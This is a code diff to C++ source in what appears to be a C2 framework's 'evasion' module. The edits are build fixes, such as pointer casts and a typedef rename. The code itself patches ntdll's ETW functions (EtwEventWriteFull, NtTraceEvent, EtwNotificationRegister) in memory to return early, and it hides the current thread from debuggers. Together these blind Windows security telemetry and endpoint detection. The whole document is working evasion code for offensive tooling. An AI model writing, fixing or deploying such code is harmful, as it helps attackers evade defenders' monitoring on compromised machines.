@@ -1,5 +1,6 @@
 #ifdef _WIN32
 #include <windows.h>
+#include <winternl.h>
 #include <cstring>
 
 namespace rtlc2 { namespace evasion {
@@ -10,7 +11,7 @@ bool PatchEtwTi() {
     if (!hNtdll) return false;
 
     // Patch EtwEventWriteFull
-    void* pFunc = GetProcAddress(hNtdll, "EtwEventWriteFull");
+    void* pFunc = (void*)GetProcAddress(hNtdll, "EtwEventWriteFull");
     if (pFunc) {
         DWORD oldProtect;
         if (VirtualProtect(pFunc, 1, PAGE_READWRITE, &oldProtect)) {
@@ -20,7 +21,7 @@ bool PatchEtwTi() {
     }
 
     // Also patch NtTraceEvent if present
-    void* pNtTrace = GetProcAddress(hNtdll, "NtTraceEvent");
+    void* pNtTrace = (void*)GetProcAddress(hNtdll, "NtTraceEvent");
     if (pNtTrace) {
         DWORD oldProtect;
         if (VirtualProtect(pNtTrace, 1, PAGE_READWRITE, &oldProtect)) {
@@ -34,17 +35,17 @@ bool PatchEtwTi() {
 
 // Hide current thread from ETW Threat Intelligence via ThreadHideFromDebugger
 bool DisableEtwTiViaThread() {
-    typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
+    typedef LONG (NTAPI* NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);
 
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
 
-    auto NtSetInfoThread = reinterpret_cast<pNtSetInformationThread>(
+    auto NtSetInfoThread = reinterpret_cast<NtSetInfoThread_t>(
         GetProcAddress(hNtdll, "NtSetInformationThread"));
     if (!NtSetInfoThread) return false;
 
     // ThreadHideFromDebugger = 0x11
-    NTSTATUS status = NtSetInfoThread(GetCurrentThread(), 0x11, nullptr, 0);
+    LONG status = NtSetInfoThread(GetCurrentThread(), 0x11, nullptr, 0);
     return status == 0;
 }
 
@@ -53,7 +54,7 @@ bool PatchEtwNotificationRegister() {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
 
-    void* pFunc = GetProcAddress(hNtdll, "EtwNotificationRegister");
+    void* pFunc = (void*)GetProcAddress(hNtdll, "EtwNotificationRegister");
     if (!pFunc) return false;
 
     // Overwrite with: xor eax, eax; ret (return STATUS_SUCCESS)
